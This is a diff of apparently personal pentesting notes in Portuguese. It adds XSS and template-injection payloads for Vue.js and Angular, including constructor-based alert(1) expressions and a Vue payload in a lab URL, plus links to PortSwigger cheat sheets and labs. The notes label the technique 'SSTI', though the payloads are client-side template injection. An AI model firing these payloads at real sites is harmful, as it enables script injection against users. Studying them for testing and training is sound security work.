@@ -9329,13 +9329,31 @@ payloads XSS
 	src=1'onerror='alert(')'
 	math=1';f(1)//
 
-Payloads para testar e explorar o VUE.js Olhar a pagina se tem algo como VUE.JS ou olhar o plugin Vue Js Dev Tools
+SSTI afeta principalmente Angular e VUE.js
+
+Payloads para testar e explorar o VUE.js Olhar a pagina se tem algo como VUE.JS ou olhar o plugin Vue Js Dev Tools. 
 
    v-show Mostrar ou esconder um componente da tela `<p v-show="_c.constructoralert(1)()"></p>`
    O payload acima também se aplica para as diretivas: `v-for, v-model, v-on <x v-on:click='_b.constructoralert(1)()'>click</x>`
    v-bind `<x is=script src=//⑭.R>`
 
 [Payloads PRONTOS ](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#vuejs-reflected) `https://portswigger-labs.net/xss/vuejs2.php?x={{_c.constructor(%27alert(1)%27)()}}`
+
+Paylaods para Angular
+
+	{{ 7*7 }} => resulta em 49
+	{{ this }}
+	{{ this.toString() }}
+	{{ constructor.toString() }}
+	{{ constructor.constructor('alert(1)')() }}
+
+
+LABS
+[Paylaods prontos](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
+[Reflected XSS with AngularJS sandbox escape without strings](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-without-strings)
+
+[Reflected XSS with AngularJS sandbox escape and CSP](https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp)
 
 
 Prototype Pollution
